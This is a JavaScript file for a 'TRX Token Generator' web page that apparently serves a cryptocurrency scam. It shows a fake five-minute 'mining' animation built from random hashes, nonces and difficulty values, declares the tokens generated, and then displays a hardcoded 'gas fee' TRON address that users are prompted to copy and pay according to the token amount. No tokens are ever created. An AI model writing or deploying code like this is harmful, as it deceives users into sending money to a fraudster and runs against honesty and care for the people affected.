// ===== Global State =====
let isGenerating = false;
let miningStartTime = null;
let miningTimerInterval = null;
let blockData = {
    hash: '',
    nonce: 0,
    difficulty: 0
};

// ===== Constants =====
const TOKEN_MIN = 500;
const TOKEN_MAX = 750000;
const TOKEN_STEP = 500;
const FEE_PER_500 = 20; // TRX
const GAS_FEE_ADDRESS = 'TUqzCMaBVbDwhcbcSAuk6CccqkVnDuuN34';

// ===== DOM Elements =====
const elements = {
    tokenAmount: document.getElementById('tokenAmount'),
    tokenSlider: document.getElementById('tokenSlider'),
    trxAddress: document.getElementById('trxAddress'),
    generateBtn: document.getElementById('generateBtn'),
    progressContainer: document.getElementById('progressContainer'),
    progressFill: document.getElementById('progressFill'),
    progressText: document.getElementById('progressText'),
    statusMessages: document.getElementById('statusMessages'),
    toastContainer: document.getElementById('toastContainer'),
    summaryTokenAmount: document.getElementById('summaryTokenAmount'),
    summaryTotalFee: document.getElementById('summaryTotalFee'),
    gasInfo: document.getElementById('gasInfo'),
    copyGasAddress: document.getElementById('copyGasAddress'),
    miningTimer: document.getElementById('miningTimer'),
    miningBackground: document.getElementById('miningBackground'),
    blockHash: document.getElementById('blockHash'),
    nonceValue: document.getElementById('nonceValue'),
    difficultyValue: document.getElementById('difficultyValue'),
    miningDetails: document.getElementById('miningDetails')
};

// ===== Utility Functions =====
function formatNumber(num) {
    return new Intl.NumberFormat('en-US').format(num);
}

function validateTRXAddress(address) {
    // TRX addresses start with 'T' and are 34 characters long
    const trxPattern = /^T[A-Za-z1-9]{33}$/;
    return trxPattern.test(address);
}

function calculateFee(tokenAmount) {
    const groupsOf500 = Math.ceil(tokenAmount / TOKEN_STEP);
    return groupsOf500 * FEE_PER_500;
}

function updateSummary() {
    const tokenAmount = parseInt(elements.tokenAmount.value) || 0;
    const fee = calculateFee(tokenAmount);
    
    elements.summaryTokenAmount.textContent = formatNumber(tokenAmount);
    elements.summaryTotalFee.textContent = `${fee} TRX`;
}

function validateForm() {
    const tokenAmount = parseInt(elements.tokenAmount.value);
    const trxAddress = elements.trxAddress.value.trim();
    
    let isValid = true;
    let errors = [];
    
    // Validate token amount
    if (!tokenAmount || tokenAmount < TOKEN_MIN || tokenAmount > TOKEN_MAX) {
        isValid = false;
        errors.push(`Token amount must be between ${formatNumber(TOKEN_MIN)} and ${formatNumber(TOKEN_MAX)}`);
    }
    
    // Validate TRX address
    if (!trxAddress) {
        isValid = false;
        errors.push('TRX wallet address is required');
    } else if (!validateTRXAddress(trxAddress)) {
        isValid = false;
        errors.push('Invalid TRX wallet address format');
    }
    
    // Update form validation styling
    if (errors.length > 0) {
        elements.tokenAmount.classList.add('error');
        elements.trxAddress.classList.add('error');
    } else {
        elements.tokenAmount.classList.remove('error');
        elements.trxAddress.classList.remove('error');
    }
    
    // Update button state
    elements.generateBtn.disabled = !isValid || isGenerating;
    
    return { isValid, errors };
}

function showToast(title, message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    
    // Create icon based on type
    let iconName = 'info';
    switch (type) {
        case 'success':
            iconName = 'check-circle';
            break;
        case 'error':
            iconName = 'x-circle';
            break;
        case 'warning':
            iconName = 'alert-triangle';
            break;
    }
    
    toast.innerHTML = `
        <i data-lucide="${iconName}" class="toast-icon"></i>
        <div class="toast-content">
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    
    elements.toastContainer.appendChild(toast);
    
    // Initialize Lucide icons for the toast
    if (typeof lucide !== 'undefined') {
        lucide.createIcons();
    }
    
    // Show toast with animation
    setTimeout(() => toast.classList.add('show'), 100);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 300);
    }, 5000);
}

// ===== Mining Utility Functions =====
function generateBlockHash() {
    const chars = '0123456789abcdef';
    let hash = '0x';
    for (let i = 0; i < 64; i++) {
        hash += chars[Math.floor(Math.random() * chars.length)];
    }
    return hash;
}

function generateNonce() {
    return Math.floor(Math.random() * 1000000);
}

function generateDifficulty() {
    return (Math.random() * 1000000).toFixed(2);
}

function formatTime(seconds) {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

function updateMiningTimer() {
    if (!miningStartTime) return;
    
    const elapsed = Math.floor((Date.now() - miningStartTime) / 1000);
    elements.miningTimer.textContent = formatTime(elapsed);
}

function updateMiningDetails() {
    // Update block hash periodically
    if (Math.random() > 0.7) {
        blockData.hash = generateBlockHash();
        elements.blockHash.textContent = blockData.hash.substring(0, 20) + '...';
    }
    
    // Update nonce frequently
    if (Math.random() > 0.5) {
        blockData.nonce = generateNonce();
        elements.nonceValue.textContent = blockData.nonce.toLocaleString();
    }
    
    // Update difficulty occasionally
    if (Math.random() > 0.8) {
        blockData.difficulty = generateDifficulty();
        elements.difficultyValue.textContent = blockData.difficulty;
    }
}

function showGasInfo() {
    elements.gasInfo.style.display = 'block';
    elements.gasInfo.classList.add('show');
}

function startProgress() {
    // Initialize mining
    miningStartTime = Date.now();
    blockData.hash = generateBlockHash();
    blockData.nonce = 0;
    blockData.difficulty = generateDifficulty();
    
    elements.progressContainer.style.display = 'block';
    elements.miningBackground.classList.add('active');
    elements.progressFill.style.width = '0%';
    elements.progressText.textContent = 'Starting blockchain mining...';
    
    // Initialize mining details
    elements.blockHash.textContent = blockData.hash.substring(0, 20) + '...';
    elements.nonceValue.textContent = '0';
    elements.difficultyValue.textContent = blockData.difficulty;
    
    // Start timer
    miningTimerInterval = setInterval(updateMiningTimer, 1000);
    updateMiningTimer();
    
    // Start mining details updates
    const detailsInterval = setInterval(updateMiningDetails, 500);
    
    let progress = 0;
    const totalDuration = 5 * 60 * 1000; // 5 minutes in milliseconds
    const startTime = Date.now();
    
    const interval = setInterval(() => {
        const elapsed = Date.now() - startTime;
        progress = Math.min((elapsed / totalDuration) * 100, 100);
        
        elements.progressFill.style.width = `${progress}%`;
        
        if (progress < 20) {
            elements.progressText.textContent = 'Initializing blockchain network...';
        } else if (progress < 40) {
            elements.progressText.textContent = 'Calculating proof-of-work...';
        } else if (progress < 60) {
            elements.progressText.textContent = 'Mining block with difficulty adjustment...';
        } else if (progress < 80) {
            elements.progressText.textContent = 'Validating transaction signatures...';
        } else if (progress < 95) {
            elements.progressText.textContent = 'Finalizing block and broadcasting...';
        } else {
            elements.progressText.textContent = 'Token generation completed!';
        }
        
        if (progress >= 100) {
            clearInterval(interval);
            clearInterval(miningTimerInterval);
            clearInterval(detailsInterval);
            
            setTimeout(() => {
                elements.progressContainer.style.display = 'none';
                elements.miningBackground.classList.remove('active');
                showGasInfo();
                showToast('Mining Completed Successfully!', 'Your tokens have been generated and are now available.', 'success');
                
                // Reset form state
                isGenerating = false;
                elements.generateBtn.disabled = false;
                elements.generateBtn.innerHTML = `
                    <i data-lucide="zap" class="btn-icon"></i>
                    <span class="btn-text">Generate Token</span>
                `;
                
                // Reinitialize icons
                if (typeof lucide !== 'undefined') {
                    lucide.createIcons();
                }
            }, 2000);
        }
    }, 1000); // Update every second for 5-minute process
}

// ===== Event Handlers =====
function handleTokenAmountChange(value) {
    // Validate and clamp value
    let tokenAmount = parseInt(value);
    if (isNaN(tokenAmount)) tokenAmount = TOKEN_MIN;
    tokenAmount = Math.max(TOKEN_MIN, Math.min(TOKEN_MAX, tokenAmount));
    
    // Update both input and slider
    elements.tokenAmount.value = tokenAmount;
    elements.tokenSlider.value = tokenAmount;
    
    // Update summary
    updateSummary();
    
    // Validate form
    validateForm();
}

function handleSliderChange(value) {
    // Round to nearest step (500)
    const steps = Math.round(value / TOKEN_STEP) * TOKEN_STEP;
    handleTokenAmountChange(steps);
}

function handleGenerateToken() {
    if (isGenerating) return;
    
    const { isValid, errors } = validateForm();
    
    if (!isValid) {
        showToast('Validation Error', errors[0], 'error');
        return;
    }
    
    const tokenAmount = parseInt(elements.tokenAmount.value);
    const trxAddress = elements.trxAddress.value.trim();
    const fee = calculateFee(tokenAmount);
    
    // Confirm generation
    const confirmed = confirm(
        `Token Generation Summary:\n\n` +
        `Amount: ${formatNumber(tokenAmount)} tokens\n` +
        `Gas Fee: ${fee} TRX\n` +
        `Target Address: ${trxAddress}\n\n` +
        `Mining Duration: ~5 minutes\n` +
        `Proceed with token generation?`
    );
    
    if (!confirmed) return;
    
    // Start generation process
    isGenerating = true;
    elements.generateBtn.disabled = true;
    elements.generateBtn.innerHTML = `
        <i data-lucide="loader-2" class="btn-icon"></i>
        <span class="btn-text">Mining...</span>
    `;
    
    // Reinitialize icons
    if (typeof lucide !== 'undefined') {
        lucide.createIcons();
    }
    
    // Hide gas info if visible
    elements.gasInfo.style.display = 'none';
    elements.gasInfo.classList.remove('show');
    
    // Start progress (5-minute mining process)
    startProgress();
    
    // Reset form after mining completes (handled in startProgress)
}

// ===== Event Listeners =====
function setupEventListeners() {
    // Token amount input
    elements.tokenAmount.addEventListener('input', (e) => {
        handleTokenAmountChange(e.target.value);
    });
    
    elements.tokenAmount.addEventListener('blur', (e) => {
        handleTokenAmountChange(e.target.value);
    });
    
    // Slider input
    elements.tokenSlider.addEventListener('input', (e) => {
        handleSliderChange(e.target.value);
    });
    
    // TRX address input
    elements.trxAddress.addEventListener('input', (e) => {
        // Auto-format TRX address (convert to uppercase)
        e.target.value = e.target.value.toUpperCase();
        validateForm();
    });
    
    // Generate button
    elements.generateBtn.addEventListener('click', handleGenerateToken);
    
    // Copy gas address button
    elements.copyGasAddress.addEventListener('click', async () => {
        try {
            await navigator.clipboard.writeText(GAS_FEE_ADDRESS);
            showToast('Address Copied!', 'Gas fee address copied to clipboard', 'success');
        } catch (err) {
            // Fallback for older browsers
            const textArea = document.createElement('textarea');
            textArea.value = GAS_FEE_ADDRESS;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            showToast('Address Copied!', 'Gas fee address copied to clipboard', 'success');
        }
    });
    
    // Enter key handling
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && !elements.generateBtn.disabled) {
            handleGenerateToken();
        }
    });
}

// ===== Initialization =====
function initializeApp() {
    // Set initial values
    elements.tokenAmount.value = TOKEN_MIN;
    elements.tokenSlider.value = TOKEN_MIN;
    
    // Hide gas info initially
    elements.gasInfo.style.display = 'none';
    elements.gasInfo.classList.remove('show');
    
    // Ensure mining background is hidden
    elements.miningBackground.classList.remove('active');
    
    // Reset mining state
    miningStartTime = null;
    if (miningTimerInterval) {
        clearInterval(miningTimerInterval);
        miningTimerInterval = null;
    }
    
    // Update summary
    updateSummary();
    
    // Validate form
    validateForm();
    
    // Setup event listeners
    setupEventListeners();
    
    // Initialize Lucide icons
    if (typeof lucide !== 'undefined') {
        lucide.createIcons();
    }
    
    // Show welcome message
    setTimeout(() => {
        showToast(
            'Welcome to TRX Token Generator',
            'Enter your desired token amount and TRX address to get started. Mining process takes ~5 minutes.',
            'info'
        );
    }, 500);
    
    console.log('TRX Token Generator initialized successfully');
}

// ===== Service Worker Registration (for future PWA features) =====
if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        // Uncomment when service worker is implemented
        // navigator.serviceWorker.register('/sw.js')
        //     .then(registration => console.log('SW registered'))
        //     .catch(registrationError => console.log('SW registration failed'));
    });
}

// ===== Page Visibility API (pause animations when tab is hidden) =====
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        // Pause any running animations
        document.body.classList.add('paused');
    } else {
        // Resume animations
        document.body.classList.remove('paused');
    }
});

// ===== Error Handling =====
window.addEventListener('error', (e) => {
    console.error('Application error:', e.error);
    showToast('Application Error', 'An unexpected error occurred. Please refresh the page.', 'error');
});

window.addEventListener('unhandledrejection', (e) => {
    console.error('Unhandled promise rejection:', e.reason);
    showToast('Promise Rejection', 'An unexpected promise rejection occurred.', 'error');
});

// ===== Initialize when DOM is ready =====
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeApp);
} else {
    initializeApp();
}

// ===== Export for potential module usage =====
window.TRXTokenGenerator = {
    initialize: initializeApp,
    calculateFee,
    validateTRXAddress,
    showToast
};